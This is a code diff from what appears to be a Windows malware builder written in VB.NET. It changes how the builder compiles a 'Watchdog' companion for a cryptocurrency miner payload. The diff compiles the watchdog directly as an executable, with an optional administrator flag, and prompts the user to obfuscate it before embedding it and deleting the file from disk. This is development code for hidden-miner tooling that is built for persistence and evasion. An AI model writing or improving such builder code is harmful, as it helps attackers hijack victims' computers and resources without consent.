@@ -110,26 +110,14 @@ Public Class Form1
                     txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
                     Dim watchdogpath = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-watchdog"
 
-                    Codedom.WatchdogCompiler(watchdogpath & ".dll", My.Resources.Watchdog)
+                    Codedom.WatchdogCompiler(watchdogpath & ".exe", My.Resources.Watchdog, FA.toggleAdministrator.Checked)
                     If Codedom.WatchdogOK Then
-                        txtLog.Text = txtLog.Text + ("Compiled Watchdog payload!" + vbNewLine)
+                        txtLog.Text = txtLog.Text + ("Compiled Watchdog!" + vbNewLine)
                         If FA.toggleObfuscation.Checked Then
-                            MessageBox.Show("The Watchdog payload has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".dll" & "). Press OK after you're done with obfuscating and replacing the Watchdog payload.")
+                            MessageBox.Show("The Watchdog has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating and replacing the Watchdog.")
                         End If
-                        Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"), Nothing, FA.toggleAdministrator.Checked)
-
-                        If Codedom.LoaderOK Then
-                            File.Delete(watchdogpath & ".dll")
-                            txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
-                            If FA.toggleObfuscation.Checked Then
-                                MessageBox.Show("The Watchdog loader has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating and replacing the Watchdog loader.")
-                            End If
-                            watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
-                            File.Delete(watchdogpath & ".exe")
-                        Else
-                            BuildError("Error compiling Watchdog loader!")
-                            Return
-                        End If
+                        watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
+                        File.Delete(watchdogpath & ".exe")
                     Else
                         BuildError("Error compiling Watchdog payload!")
                         Return
